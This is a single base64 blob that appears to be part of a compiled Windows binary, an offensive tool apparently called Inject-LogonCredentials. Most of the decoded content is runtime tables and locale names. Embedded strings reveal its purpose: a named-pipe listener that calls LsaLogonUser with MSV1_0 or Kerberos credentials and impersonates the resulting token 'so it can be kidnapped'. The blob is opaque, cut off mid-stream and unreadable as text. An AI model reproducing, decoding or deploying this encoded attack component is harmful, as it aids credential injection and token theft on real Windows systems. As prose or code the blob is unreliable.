AgAEAAAApBAAAAAAAAMj8AIABAAAAKgQAAAAAAADY/ACAAQAAACsEAAAAAAAA6PwAgAEAAAAsBAAAAAAAAPj8AIABAAAALQQAAAAAAAAQ/QCAAQAAAC8EAAAAAAAAIP0AgAEAAAAyBAAAAAAAADD9AIABAAAANAQAAAAAAABA/QCAAQAAADUEAAAAAAAAUP0AgAEAAAA2BAAAAAAAAGD9AIABAAAANwQAAAAAAABw/QCAAQAAADgEAAAAAAAAgP0AgAEAAAA5BAAAAAAAAJD9AIABAAAAOgQAAAAAAACg/QCAAQAAADsEAAAAAAAAsP0AgAEAAAA+BAAAAAAAAMD9AIABAAAAPwQAAAAAAADQ/QCAAQAAAEAEAAAAAAAA4P0AgAEAAABBBAAAAAAAAPD9AIABAAAAQwQAAAAAAAAA/gCAAQAAAEQEAAAAAAAAGP4AgAEAAABFBAAAAAAAACj+AIABAAAARgQAAAAAAAA4/gCAAQAAAEcEAAAAAAAASP4AgAEAAABJBAAAAAAAAFj+AIABAAAASgQAAAAAAABo/gCAAQAAAEsEAAAAAAAAeP4AgAEAAABMBAAAAAAAAIj+AIABAAAATgQAAAAAAACY/gCAAQAAAE8EAAAAAAAAqP4AgAEAAABQBAAAAAAAALj+AIABAAAAUgQAAAAAAADI/gCAAQAAAFYEAAAAAAAA2P4AgAEAAABXBAAAAAAAAOj+AIABAAAAWgQAAAAAAAD4/gCAAQAAAGUEAAAAAAAACP8AgAEAAABrBAAAAAAAABj/AIABAAAAbAQAAAAAAAAo/wCAAQAAAIEEAAAAAAAAOP8AgAEAAAABCAAAAAAAAEj/AIABAAAABAgAAAAAAADY+ACAAQAAAAcIAAAAAAAAWP8AgAEAAAAJCAAAAAAAAGj/AIABAAAACggAAAAAAAB4/wCAAQAAAAwIAAAAAAAAiP8AgAEAAAAQCAAAAAAAAJj/AIABAAAAEwgAAAAAAACo/wCAAQAAABQIAAAAAAAAuP8AgAEAAAAWCAAAAAAAAMj/AIABAAAAGggAAAAAAADY/wCAAQAAAB0IAAAAAAAA8P8AgAEAAAAsCAAAAAAAAAAAAYABAAAAOwgAAAAAAAAYAAGAAQAAAD4IAAAAAAAAKAABgAEAAABDCAAAAAAAADgAAYABAAAAawgAAAAAAABQAAGAAQAAAAEMAAAAAAAAYAABgAEAAAAEDAAAAAAAAHAAAYABAAAABwwAAAAAAACAAAGAAQAAAAkMAAAAAAAAkAABgAEAAAAKDAAAAAAAAKAAAYABAAAADAwAAAAAAACwAAGAAQAAABoMAAAAAAAAwAABgAEAAAA7DAAAAAAAANgAAYABAAAAawwAAAAAAADoAAGAAQAAAAEQAAAAAAAA+AABgAEAAAAEEAAAAAAAAAgBAYABAAAABxAAAAAAAAAYAQGAAQAAAAkQAAAAAAAAKAEBgAEAAAAKEAAAAAAAADgBAYABAAAADBAAAAAAAABIAQGAAQAAABoQAAAAAAAAWAEBgAEAAAA7EAAAAAAAAGgBAYABAAAAARQAAAAAAAB4AQGAAQAAAAQUAAAAAAAAiAEBgAEAAAAHFAAAAAAAAJgBAYABAAAACRQAAAAAAACoAQGAAQAAAAoUAAAAAAAAuAEBgAEAAAAMFAAAAAAAAMgBAYABAAAAGhQAAAAAAADYAQGAAQAAADsUAAAAAAAA8AEBgAEAAAABGAAAAAAAAAACAYABAAAACRgAAAAAAAAQAgGAAQAAAAoYAAAAAAAAIAIBgAEAAAAMGAAAAAAAADACAYABAAAAGhgAAAAAAABAAgGAAQAAADsYAAAAAAAAWAIBgAEAAAABHAAAAAAAAGgCAYABAAAACRwAAAAAAAB4AgGAAQAAAAocAAAAAAAAiAIBgAEAAAAaHAAAAAAAAJgCAYABAAAAOxwAAAAAAACwAgGAAQAAAAEgAAAAAAAAwAIBgAEAAAAJIAAAAAAAANACAYABAAAACiAAAAAAAADgAgGAAQAAADsgAAAAAAAA8AIBgAEAAAABJAAAAAAAAAADAYABAAAACSQAAAAAAAAQAwGAAQAAAAokAAAAAAAAIAMBgAEAAAA7JAAAAAAAADADAYABAAAAASgAAAAAAABAAwGAAQAAAAkoAAAAAAAAUAMBgAEAAAAKKAAAAAAAAGADAYABAAAAASwAAAAAAABwAwGAAQAAAAksAAAAAAAAgAMBgAEAAAAKLAAAAAAAAJADAYABAAAAATAAAAAAAACgAwGAAQAAAAkwAAAAAAAAsAMBgAEAAAAKMAAAAAAAAMADAYABAAAAATQAAAAAAADQAwGAAQAAAAk0AAAAAAAA4AMBgAEAAAAKNAAAAAAAAPADAYABAAAAATg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jdG9yIGl0ZXJhdG9yJwAAAABgdmVjdG9yIHZiYXNlIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAAAAYHZpcnR1YWwgZGlzcGxhY2VtZW50IG1hcCcAAAAAAABgZWggdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAAAAAAAAYGVoIHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwBgZWggdmVjdG9yIHZiYXNlIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAYGNvcHkgY29uc3RydWN0b3IgY2xvc3VyZScAAAAAAABgdWR0IHJldHVybmluZycAYEVIAGBSVFRJAAAAAAAAAGBsb2NhbCB2ZnRhYmxlJwBgbG9jYWwgdmZ0YWJsZSBjb25zdHJ1Y3RvciBjbG9zdXJlJwAgbmV3W10AAAAAAAAgZGVsZXRlW10AAAAAAAAAYG9tbmkgY2FsbHNpZycAAGBwbGFjZW1lbnQgZGVsZXRlIGNsb3N1cmUnAAAAAAAAYHBsYWNlbWVudCBkZWxldGVbXSBjbG9zdXJlJwAAAABgbWFuYWdlZCB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYG1hbmFnZWQgdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAAAAAGBlaCB2ZWN0b3IgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgZWggdmVjdG9yIHZiYXNlIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAABgZHluYW1pYyBpbml0aWFsaXplciBmb3IgJwAAAAAAAGBkeW5hbWljIGF0ZXhpdCBkZXN0cnVjdG9yIGZvciAnAAAAAAAAAABgdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAAAAYHZlY3RvciB2YmFzZSBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAAAAAAAAYG1hbmFnZWQgdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAAAAYGxvY2FsIHN0YXRpYyB0aHJlYWQgZ3VhcmQnAAAAAAAgVHlwZSBEZXNjcmlwdG9yJwAAAAAAAAAgQmFzZSBDbGFzcyBEZXNjcmlwdG9yIGF0ICgAAAAAACBCYXNlIENsYXNzIEFycmF5JwAAAAAAACBDbGFzcyBIaWVyYXJjaHkgRGVzY3JpcHRvcicAAAAAIENvbXBsZXRlIE9iamVjdCBMb2NhdG9yJwAAAAAAAAAAAAAAAAAAAAaAgIaAgYAAABADhoCGgoAUBQVFRUWFhYUFAAAwMIBQgIgACAAoJzhQV4AABwA3MDBQUIgAAAAgKICIgIAAAABgaGBoaGgICAd4cHB3cHAICAAACAAIAAcIAAAAU3VuAE1vbgBUdWUAV2VkAFRodQBGcmkAU2F0AFN1bmRheQAATW9uZGF5AABUdWVzZGF5AFdlZG5lc2RheQAAAAAAAABUaHVyc2RheQAAAABGcmlkYXkAAAAAAABTYXR1cmRheQAAAABKYW4ARmViAE1hcgBBcHIATWF5AEp1bgBKdWwAQXVnAFNlcABPY3QATm92AERlYwAAAAAASmFudWFyeQBGZWJydWFyeQAAAABNYXJjaAAAAEFwcmlsAAAASnVuZQAAAABKdWx5AAAAAEF1Z3VzdAAAAAAAAFNlcHRlbWJlcgAAAAAAAABPY3RvYmVyAE5vdmVtYmVyAAAAAAAAAABEZWNlbWJlcgAAAABBTQAAUE0AAAAAAABNTS9kZC95eQAAAAAAAAAAZGRkZCwgTU1NTSBkZCwgeXl5eQAAAAAASEg6bW06c3MAAAAAAAAAAFMAdQBuAAAATQBvAG4AAABUAHUAZQAAAFcAZQBkAAAAVABoAHUAAABGAHIAaQAAAFMAYQB0AAAAUwB1AG4AZABhAHkAAAAAAE0AbwBuAGQAYQB5AAAAAABUAHUAZQBzAGQAYQB5AAAAVwBlAGQAbgBlAHMAZABhAHkAAAAAAAAAVABoAHUAcgBzAGQAYQB5AAAAAAAAAAAARgByAGkAZABhAHkAAAAAAFMAYQB0AHUAcgBkAGEAeQAAAAAAAAAAAEoAYQBuAAAARgBlAGIAAABNAGEAcgAAAEEAcAByAAAATQBhAHkAAABKAHUAbgAAAEoAdQBsAAAAQQB1AGcAAABTAGUAcAAAAE8AYwB0AAAATgBvAHYAAABEAGUAYwAAAEoAYQBuAHUAYQByAHkAAABGAGUAYgByAHUAYQByAHkAAAAAAAAAAABNAGEAcgBjAGgAAAAAAAAAQQBwAHIAaQBsAAAAAAAAAEoAdQBuAGUAAAAAAAAAAABKAHUAbAB5AAAAAAAAAAAAQQB1AGcAdQBzAHQAAAAAAFMAZQBwAHQAZQBtAGIAZQByAAAAAAAAAE8AYwB0AG8AYgBlAHIAAABOAG8AdgBlAG0AYgBlAHIAAAAAAAAAAABEAGUAYwBlAG0AYgBlAHIAAAAAAEEATQAAAAAAUABNAAAAAAAAAAAATQBNAC8AZABkAC8AeQB5AAAAAAAAAAAAZABkAGQAZAAsACAATQBNAE0ATQAgAGQAZAAsACAAeQB5AHkAeQAAAEgASAA6AG0AbQA6AHMAcwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAIAAgACAAIAAgACAAIAAgACgAKAAoACgAKAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABIABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAIQAhACEAIQAhACEAIQAhACEAIQAEAAQABAAEAAQABAAEACBAIEAgQCBAIEAgQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAEAAQABAAEAAQABAAggCCAIIAggCCAIIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACABAAEAAQABAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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